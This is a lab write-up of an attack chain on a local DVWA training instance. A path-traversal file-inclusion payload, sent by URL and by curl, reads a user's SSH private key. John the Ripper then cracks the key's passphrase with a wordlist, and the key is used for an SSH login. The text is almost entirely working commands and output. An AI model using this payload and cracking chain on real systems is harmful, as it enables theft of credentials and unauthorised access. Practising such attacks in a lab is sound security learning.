Local File Inclusion (SSH Private Key):

Used the LFI vulnerability to read the ssh private key file:
http://dvwa.local/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../../../home/kali/.ssh/id_rsa
(View the page source)
OR
┌──(kali㉿kali)-[~]
└─$ curl -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../../../home/kali/.ssh/id_rsa"
R3D4CT3D5TR1NG <snip>

Cracked the private key password:
┌──(kali㉿kali)-[~]
└─$ echo "R3D4CT3D5TR1NG" | base64 -d > id_rsa

┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa > ssh.hash

┌──(kali㉿kali)-[~]
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
[sudo] password for kali: 
                                                                                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (id_rsa)     
1g 0:00:00:02 DONE (2025-05-25 21:04) 0.3690g/s 35.42p/s 35.42c/s 35.42C/s samantha..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa kali@172.28.52.210
Enter passphrase for key 'id_rsa': 
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)

┌──(kali㉿wsl)-[~]
└─$  
